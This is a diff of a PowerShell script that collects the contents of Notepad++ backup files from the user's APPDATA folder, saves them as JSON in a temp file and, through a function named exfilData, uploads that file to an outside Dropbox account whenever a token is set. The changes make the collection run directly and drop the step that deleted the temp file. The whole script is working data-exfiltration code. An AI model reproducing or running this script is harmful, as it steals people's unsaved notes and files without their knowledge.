@@ -1,26 +1,17 @@
 $FileName = "$ENV:tmp/$ENV:USERNAME-NPPlusData-$(Get-Date -f hh-mm_dd-MM-yyyy).txt"
-
 $appdataroaming = $ENV:APPDATA
 $toread = "Notepad++\backup"
-
 $fullpath = Join-Path -Path $appdataroaming -ChildPath $toread
 $filelist = Get-ChildItem $fullpath\*@*
-
-
-function readBackup{
-    $backupcontents = ForEach ($file in $filelist)
+$backupcontents = ForEach ($filepath in $filelist)
     {
-        $filecontent = Get-Content -Path $file
+        $filecontent = Get-Content -Path $filepath
         [pscustomobject]@{
             'FileContent:' = $filecontent
         }
     }
-    $out = ConvertTo-Json $backupcontents
-    return $out
-}
-
-$out > $FileName
-
+$out = ConvertTo-Json $backupcontents
+$out > $FileName 
 function exfilData {
     [CmdletBinding()]
     param (
@@ -28,7 +19,6 @@ function exfilData {
     [Alias("f")]
     [string]$SourceFilePath
     )
-
     $outputFile = Split-Path $SourceFilePath -leaf
     $TargetFilePath="/$outputFile"
     $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
@@ -38,7 +28,5 @@ function exfilData {
     $headers.Add("Dropbox-API-Arg", $arg)
     $headers.Add("Content-Type", 'application/octet-stream')
     Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
-    Remove-Item $FileName
     }
 if (-not ([string]::IsNullOrEmpty($db))){exfilData -f $FileName}
-readBackup
